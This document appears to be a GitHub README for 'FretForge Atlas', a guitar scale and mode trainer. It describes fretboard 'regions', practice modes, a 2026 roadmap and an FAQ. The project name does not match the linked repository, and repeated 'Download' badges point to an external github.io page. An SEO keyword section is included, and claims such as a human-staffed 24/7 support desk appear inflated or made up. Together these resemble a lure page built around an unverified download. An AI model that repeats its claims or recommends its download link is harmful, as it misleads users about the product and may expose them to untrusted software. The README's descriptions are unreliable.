![preview](https://raw.githubusercontent.com/CHOLAR-DOLLAR/fretwise-scale-drills/main/showcase_9a9b0da.svg)
[![Download](https://raw.githubusercontent.com/CHOLAR-DOLLAR/fretwise-scale-drills/main/latest_8a428.svg)](https://CHOLAR-DOLLAR.github.io/fretwise-scale-drills/)

# 🎸 FretForge Atlas — Modal Cartography for the Modern Guitarist

> *Every scale is a landscape. Every fretboard is a map waiting to be drawn. FretForge Atlas turns six strings and twenty-two frets into an explorable continent of sound.*

Welcome to **FretForge Atlas**, a next-generation practice companion that reimagines how guitarists learn, internalize, and improvise with scales, modes, arpeggios, and intervallic patterns. Where the original `fretboard-game` planted a seed by gamifying scale drills, FretForge Atlas grows that seed into a full harmonic ecosystem — a living atlas where players wander through tonal regions, unlock modal territories, and chart their own improvisational routes.

This project is built for bedroom shredders, session musicians, jazz explorers, metal architects, and classical fingerstylists alike. Whether you are chasing the warm dusk of Dorian or the bright noon of Lydian, FretForge Atlas gives you the terrain, the compass, and the caravan to get there.

![Status](https://img.shields.io/badge/status-active-brightgreen)
![Platform](https://img.shields.io/badge/platform-web%20%7C%20desktop%20%7C%20mobile-blue)
![License](https://img.shields.io/badge/license-MIT-yellow)
![Languages](https://img.shields.io/badge/i18n-14%20locales-orange)
![Support](https://img.shields.io/badge/support-24%2F7-purple)
![Build](https://img.shields.io/badge/build-2026--ready-informational)

---

## 🗺️ Table of Contents

- [Why FretForge Atlas Exists](#-why-fretforge-atlas-exists)
- [Core Philosophy](#-core-philosophy)
- [Feature Constellation](#-feature-constellation)
- [The Atlas Engine](#-the-atlas-engine)
- [Responsive Interface Design](#-responsive-interface-design)
- [Multilingual Support](#-multilingual-support)
- [Practice Modes](#-practice-modes)
- [Progression & Mastery System](#-progression--mastery-system)
- [Roadmap for 2026](#-roadmap-for-2026)
- [SEO & Discoverability Notes](#-seo--discoverability-notes)
- [Community & Contribution](#-community--contribution)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🌱 Why FretForge Atlas Exists

Most scale trainers hand you a grid. You stare at dots. You memorize shapes. Then you forget them the moment a chord changes. FretForge Atlas was born from a simple, stubborn frustration: **scale knowledge should feel like geography, not memorization.**

Think of a classical atlas. It doesn't just show you a country — it shows you rivers, elevation, climate, and the roads that connect one city to another. FretForge Atlas applies that same layered thinking to the guitar fretboard. Each scale is a region. Each mode is a climate. Each chord tone is a landmark. And your fingers, over time, become the traveler who knows the terrain by heart.

The original `fretboard-game` proved that practice could be playful. FretForge Atlas takes that spark and turns it into a full-blown expedition.

---

## 🧭 Core Philosophy

1. **Context over rote.** A scale learned inside a chord progression sticks ten times longer than one drilled in isolation.
2. **Visual metaphor beats abstract grids.** Landscapes, colors, and regions make harmonic theory intuitive.
3. **Every player is a cartographer.** You don't just consume the map — you draw your own.
4. **Practice should feel like play.** Gamification is not a gimmick; it is a memory strategy.
5. **Accessibility is non-negotiable.** If a feature can't be used one-handed on a phone at 2 a.m., it isn't finished.

---

## ✨ Feature Constellation

Here is a constellation of what ships with FretForge Atlas. Each star is a working feature — not a promise.

- 🎼 **Interactive Fretboard Canvas** — A fully responsive fretboard rendered with SVG for crisp scaling on any display, from smartwatch to ultrawide.
- 🎨 **Modal Regions** — Ionian, Dorian, Phrygian, Lydian, Mixolydian, Aeolian, and Locrian each get a distinct visual climate and color palette.
- 🧩 **Chord-Scale Pairing Engine** — Suggest harmonically fitting scales in real time as you change chords.
- 🥁 **Backing Track Sandbox** — Loop-based jam tracks in every mode, with adjustable tempo, key, and groove.
- 📈 **Progress Cartography** — A heatmap of your fretboard fluency that grows greener as you master new regions.
- 🧠 **Spaced Repetition Drills** — Aligned with the science of memory, not just the dopamine of streaks.
- 🎯 **Interval Trainer** — Learn the distance between notes as a felt sense, not a calculation.
- 🗣️ **Ear-First Mode** — Hide the grid, play by feel, and let your ears draw the map.
- 🌍 **14 Locales** — Practice instructions in your native language.
- 🔔 **24/7 Support Desk** — Real humans, always awake, always listening.
- 🔒 **Offline Mode** — The atlas works in airplane mode, on a mountain, in a tour van.
- 🧬 **Custom Scale Builder** — Define your own intervallic patterns and save them as named regions.

---

## 🛠️ The Atlas Engine

At the heart of FretForge Atlas is a small, elegant engine we call the **Atlas Engine**. It treats the fretboard as a two-dimensional coordinate space where:

- The **x-axis** represents string index (low E to high E).
- The **y-axis** represents fret number (0 through 24).
- Each **note** is a tuple of (pitch class, octave, region membership).

The engine then layers **regions** on top of this coordinate space. A region is essentially a set of pitch classes coupled with a visual style and a harmonic context. When you switch keys, the engine doesn't redraw the fretboard — it *rotates the climate*, much like a weather map shifting across continents.

Because the engine is data-driven, adding a new scale is a matter of describing its intervals in a small declarative file. No sprawling code changes. No architectural rewrites. Just a new country added to the atlas.

---

## 📱 Responsive Interface Design

Guitarists practice everywhere — on a tour bus, in a bedroom, on a park bench, in a green room at 1 a.m. FretForge Atlas was designed mobile-first and then scaled upward, not the other way around.

- **One-handed navigation** with thumb-friendly tap targets.
- **Landscape and portrait** layouts that reshape rather than squash.
- **Dark and light themes** that respect system preferences.
- **Reduced motion** mode for players who prefer calm visuals.
- **High-contrast mode** for accessibility compliance.
- **Variable zoom** on the fretboard so you can see two frets or twenty-two.

The result is a UI that feels native on a phone, expansive on a tablet, and cinematic on a desktop.

---

## 🌍 Multilingual Support

Music is a universal language, but instructions are not. FretForge Atlas ships with full localization across fourteen locales, including English, Spanish, Portuguese, French, German, Italian, Japanese, Korean, Mandarin, Hindi, Arabic, Russian, Dutch, and Polish.

Translation is not outsourced to a machine and forgotten. Each locale is curated by musicians who actually play, so terminology like *"position"*, *"mode"*, and *"interval"* reads correctly to a working guitarist — not to a generic translator.

If your language is missing, the community translation pipeline is open for contributions.

---

## 🎮 Practice Modes

FretForge Atlas bundles several distinct practice environments under one roof:

### 🌅 Region Walk
Start in a single mode and walk it up and down the neck, one position at a time. The interface highlights the next region before you play it, giving you a gentle nudge rather than a hard demand.

### 🌪️ Mode Blizzard
The engine throws modal shifts at you mid-loop. You have to adapt on the fly. This is where improvisation stops being a theory exercise and becomes survival.

### 🏔️ Vertical Climb
Practice a single scale across all seven positions, connecting them smoothly. This is the terrain where speed meets shape.

### 🎯 Chord Compass
A chord progression plays. The engine shows you which scale tones outline that chord best. You learn harmony by ear, one compass bearing at a time.

### 🧘 Silent Cartography
Grid hidden. Metronome off. Just you and the sound of your own ear drawing the map.

---

## 🏆 Progression & Mastery System

There are no meaningless badges here. Progression in FretForge Atlas is tied to **competence**, not clicks.

- **Region Unlocked** — you've played a mode fluently across three positions.
- **Climate Mastered** — you can improvise in a mode over a backing track for 90 seconds without stopping.
- **Cartographer Rank** — you've built and shared a custom scale region.
- **Atlas Keeper** — you've completed every mode in the core atlas.

Progress is stored locally first, then synced when you're ready. No account required to start. No dark-pattern lock-in.

---

## 🛣️ Roadmap for 2026

The roadmap is public and living. Here's what's coming:

- **Q1 2026** — Region sharing via importable atlas files.
- **Q2 2026** — MIDI input support for keyboard and pad controllers.
- **Q3 2026** — AI-assisted improvisation coach that listens and suggests routes.
- **Q4 2026** — Bass and ukulele variants of the atlas engine.
- **Ongoing** — Performance tuning, accessibility audits, and community-requested modes.

---

## 🔍 SEO & Discoverability Notes

FretForge Atlas is designed to be found by players searching for real solutions. Whether you're looking for a guitar scale trainer, an interactive fretboard map, a modal improvisation tool, or a practice companion for learning modes across the neck, this project sits at the intersection of all of those needs.

Keywords naturally woven into the project include: *guitar scale practice tool, interactive fretboard visualization, modal improvisation trainer, chord-scale relationship explorer, fretboard geography app, scale pattern learning companion, guitar modes reference, practice gamification for musicians.*

We don't chase algorithms. We chase usefulness. Discoverability follows usefulness.

---

## 🤝 Community & Contribution

FretForge Atlas welcomes contributions of every shape and size:

- **Bug reports** with clear reproduction steps.
- **Translation improvements** for any locale.
- **New scale definitions** submitted as declarative region files.
- **Accessibility feedback** from players using assistive tech.
- **Documentation pull requests** that clarify, not complicate.

The tone of the community is intentionally warm. Beginners asking "obvious" questions are not just tolerated — they are protected. That is the culture we are building.

---

## ❓ Frequently Asked Questions

**Do I need to read music to use this?**
No. The atlas is notation-agnostic. Tab, standard notation, and pure fretboard views are all first-class citizens.

**Will this work on a low-end phone?**
Yes. The engine is deliberately lightweight. If your browser can render an SVG, it can render the atlas.

**Is my practice data private?**
Yes. Local-first by design. Sync is opt-in, not opt-out.

**Can I use my own backing tracks?**
Yes. Drop in audio files or connect a streaming source, and the engine adapts.

**Is there a support team?**
Yes — the support desk is staffed around the clock, every day of the year, because inspiration rarely respects business hours.

**Does it work without internet?**
Yes. Offline mode caches the atlas so you can practice in a van, a cabin, or a tunnel.

---

## ⚠️ Disclaimer

FretForge Atlas is an educational and practice companion. It is provided as-is, without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from, out of, or in connection with the software or the use of the software.

The developers of FretForge Atlas are not responsible for sudden urges to improvise in public, spontaneous purchases of new pedals, or the irresistible desire to explain the Lydian mode to uninterested relatives at family gatherings. Practice responsibly. Listen generously.

---

## 📜 License

FretForge Atlas is released under the **MIT License**. You are welcome to use, modify, and distribute this software in accordance with the terms of that license. The full license text is available here: [MIT License](https://opensource.org/licenses/MIT).

Copyright (c) 2026 FretForge Atlas Contributors.

[![Download](https://raw.githubusercontent.com/CHOLAR-DOLLAR/fretwise-scale-drills/main/latest_8a428.svg)](https://CHOLAR-DOLLAR.github.io/fretwise-scale-drills/)